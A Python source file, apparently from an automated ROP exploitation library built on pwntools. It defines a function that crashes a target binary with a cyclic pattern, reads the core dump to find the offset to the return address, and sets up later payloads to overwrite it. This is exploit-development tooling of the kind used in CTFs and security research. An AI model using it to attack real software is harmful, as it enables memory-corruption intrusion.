from autorop import PwnState
from pwn import tube, process, cyclic, cyclic_find, log, pack


def corefile(state: PwnState) -> PwnState:
    """Find offset to the return address via buffer overflow using corefile.

    This function not only finds the offset from the input to the return address
    on the stack, but also sets ``state.overwriter`` to be a function that correctly
    overwrites starting at the return address.

    You can avoid active corefile generation by setting ``state.bof_ret_offset``
    yourself - in this case, the ``state.overwriter`` is set appropriately.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``binary_name``: Path to binary.
            - ``bof_ret_offset``: (optional) If not ``None``,
              skips corefile generation step.
            - ``overwriter``: Function which writes rop chain to the "right place".

    Returns:
        Reference to the mutated ``PwnState``, with the following updated

            - ``bof_ret_offset``: Updated if it was not set before.
            - ``overwriter``: Now calls the previous ``overwriter`` but with
              ``bof_ret_offset`` padding bytes prepended to the data given.
    """
    #: Number of bytes to send to attempt to trigger a segfault
    #: for corefile generation.
    CYCLIC_SIZE = 1024

    if state.bof_ret_offset is None:
        # cause crash and find offset via corefile
        p: tube = process(state.binary_name)
        state.overwriter(p, cyclic(CYCLIC_SIZE))
        p.wait()
        fault: int = p.corefile.fault_addr
        log.info("Fault address @ " + hex(fault))
        state.bof_ret_offset = cyclic_find(pack(fault))
    log.info("Offset to return address is " + str(state.bof_ret_offset))

    if state.bof_ret_offset < 0:
        log.error(f"Invalid offset to return addess ({state.bof_ret_offset})!")

    old_overwriter = state.overwriter

    # define overwriter as expected - to write data starting at return address
    def overwriter(t: tube, data: bytes) -> None:
        old_overwriter(t, cyclic(state.bof_ret_offset) + data)

    state.overwriter = overwriter
    return state
